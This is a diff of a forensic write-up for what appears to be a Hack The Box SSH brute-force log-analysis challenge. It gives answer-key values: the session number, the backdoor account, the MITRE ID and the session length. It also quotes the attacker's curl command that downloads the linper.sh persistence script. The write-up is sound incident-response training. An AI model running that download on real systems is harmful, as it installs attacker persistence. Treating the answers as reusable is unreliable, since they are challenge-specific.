@@ -19,15 +19,19 @@ Successful authentication as the user `root` at 06:32:44:
 
 ### SSH login sessions are tracked and assigned a session number upon login. What is the session number assigned to the attacker's session for the user account from Question 2?
 37
+![image](https://github.com/marufrahmangit/hack-the-box/assets/25085219/c543c85a-d4a6-465d-bbcc-c7d64c4478bc)
 
 ### The attacker added a new user as part of their persistence strategy on the server and gave this new user account higher privileges. What is the name of this account?
 cyberjunkie.
+![image](https://github.com/marufrahmangit/hack-the-box/assets/25085219/1531bc2f-6cad-4d58-af23-677b6c24ce55)
 
 ### What is the MITRE ATT&CK sub-technique ID used for persistence?
-T1136.001
+[T1136.001](https://attack.mitre.org/techniques/T1136/001/)
+![image](https://github.com/marufrahmangit/hack-the-box/assets/25085219/78b15345-d619-4edb-b589-fb27cd95a572)
 
 ### How long did the attacker's first SSH session last based on the previously confirmed authentication time and session ending within the auth.log? (seconds)
-279
+Total time of the session is 06:32:45 - 06:37:24, so, 279 seconds
 
 ### The attacker logged into their backdoor account and utilized their higher privileges to download a script. What is the full command executed using sudo?
 /usr/bin/curl https://raw.githubusercontent.com/montysecurity/linper/main/linper.sh
+![image](https://github.com/marufrahmangit/hack-the-box/assets/25085219/2265c87d-7012-445c-a50f-c3169a048d31)
